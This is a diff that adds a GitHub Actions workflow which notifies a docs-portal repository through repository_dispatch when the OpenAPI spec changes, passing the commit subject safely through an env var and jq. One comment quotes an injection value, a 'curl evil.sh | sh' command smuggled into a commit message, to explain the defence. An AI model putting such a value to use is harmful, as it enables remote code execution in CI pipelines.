@@ -1,0 +1,61 @@
+name: Notify docs portal of spec change
+
+# Why this trigger shape: we only want to wake up the docs repo when the
+# contract itself changes, not on every commit to main (READMEs, CI tweaks,
+# etc. shouldn't trigger a docs rebuild + redeploy).
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - openapi.yaml
+
+jobs:
+  dispatch:
+    runs-on: ubuntu-latest
+    steps:
+      # We need the current commit's subject line for the payload, and the
+      # default checkout depth (1) still gives us `git log -1` on HEAD, so no
+      # need for a deeper fetch here.
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Get commit message
+        id: commit
+        run: |
+          # %s = subject line only, no body — keeps the payload small and
+          # avoids multi-line strings tripping up downstream JSON handling.
+          echo "message=$(git log -1 --pretty=format:'%s')" >> "$GITHUB_OUTPUT"
+
+      # This is the actual hand-off: a repository_dispatch is a webhook-style
+      # event GitHub lets one repo fire into another repo's Actions, as long
+      # as we hold a PAT with access to that target repo (a plain
+      # GITHUB_TOKEN is scoped to *this* repo only and can't cross the
+      # boundary). The docs portal listens for this exact event type in its
+      # own workflow.
+      - name: Fire repository_dispatch to docs portal
+        env:
+          # PAT with `repo` scope on the target repo, created by hand and
+          # stored as a secret here — see this repo's README for setup.
+          DOCS_REPO_DISPATCH_TOKEN: ${{ secrets.DOCS_REPO_DISPATCH_TOKEN }}
+          # Passed through env rather than substituted directly into the
+          # script below: a commit message is attacker-controlled text (a
+          # PR author can write anything), and inlining `${{ }}` expressions
+          # straight into `run:` lets a message like `"; curl evil.sh | sh`
+          # get executed as shell. Reading it from an env var, and letting
+          # jq handle the JSON escaping, keeps it as inert data.
+          COMMIT_MESSAGE: ${{ steps.commit.outputs.message }}
+        run: |
+          payload=$(jq -n \
+            --arg sha "$GITHUB_SHA" \
+            --arg message "$COMMIT_MESSAGE" \
+            '{event_type: "openapi-spec-updated", client_payload: {sha: $sha, message: $message}}')
+
+          curl -sS -X POST \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer ${DOCS_REPO_DISPATCH_TOKEN}" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            https://api.github.com/repos/OWNER/petstore-docs-portal/dispatches \
+            -d "$payload"
+          # NOTE FOR DEMO SETUP: replace OWNER/petstore-docs-portal above
+          # with the real owner/repo once both repos exist on GitHub.
